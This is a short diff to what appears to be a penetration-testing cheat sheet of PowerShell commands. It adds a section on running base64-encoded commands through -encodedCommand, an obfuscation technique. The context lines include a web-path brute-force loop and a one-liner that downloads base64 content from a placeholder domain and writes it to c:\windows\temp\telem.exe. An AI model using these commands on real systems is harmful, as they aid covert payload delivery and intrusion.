@@ -50,6 +50,14 @@
   `foreach($target in (gc .\targets_http_ip.txt)){ Get-HttpStatus -Target $target -Path .\www_wordlist.txt }`   
 
 ## Helpful PowerShell commands and scripts  
+### Base64 encoded powershell command
+```powershell
+$command = '"test" | out-file C:\users\jdoe\desktop\psout.txt'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+powershell.exe -encodedCommand $encodedCommand
+```
+
 ### File Transfer
 - Download base64 encoded files:   
   `[System.IO.File]::WriteAllBytes("c:\windows\temp\telem.exe",[System.Convert]::FromBase64String((New-Object Net.Webclient).downloadstring("https://XOURDOMAIN.COM")))`   
